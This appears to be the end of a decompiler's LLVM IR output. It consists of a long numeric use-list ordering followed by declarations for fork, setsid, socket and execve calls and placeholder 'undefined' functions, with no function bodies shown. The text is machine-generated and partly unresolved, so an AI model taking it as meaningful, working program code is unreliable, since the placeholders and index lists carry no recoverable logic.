154, 70, 71, 231, 232, 233, 234, 477, 320, 321, 322, 323, 484, 1938, 1940, 1941, 1942, 479, 1943, 480, 481, 482, 478, 265, 483, 1939, 343, 486, 487, 485, 324, 30, 489, 488, 490, 1945, 325, 326, 327, 328, 1948, 1949, 493, 491, 492, 266, 1950, 1951, 1952, 344, 282, 1956, 1957, 329, 1953, 1954, 494, 495, 496, 1955, 498, 499, 500, 501, 502, 497, 267, 503, 1958, 504, 72, 510, 73, 509, 505, 1973, 508, 269, 511, 506, 1974, 507, 268, 512, 74, 90, 1981, 1982, 345, 1983, 1984, 155, 1985, 75, 346, 1987, 270, 515, 516, 517, 518, 1989, 1990, 298, 1999, 2000, 519, 2001, 520, 2002, 2003, 521, 156, 522, 523, 524, 525, 526, 2050, 157, 76, 283, 271, 332, 333, 2040, 2041, 2042, 272, 330, 331, 334, 2043, 2044, 335, 2045, 2046, 274, 77, 158, 159, 273, 2048, 2049, 347, 160, 78, 527, 2047, 2051, 2052, 336, 2053, 1354, 1355, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 2173, 2174, 2175, 2176, 2177, 2178, 2179, 2180, 2181, 2182, 2183, 2184, 2185, 2186, 2187 }
  uselistorder i32* @r4, {}
}

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
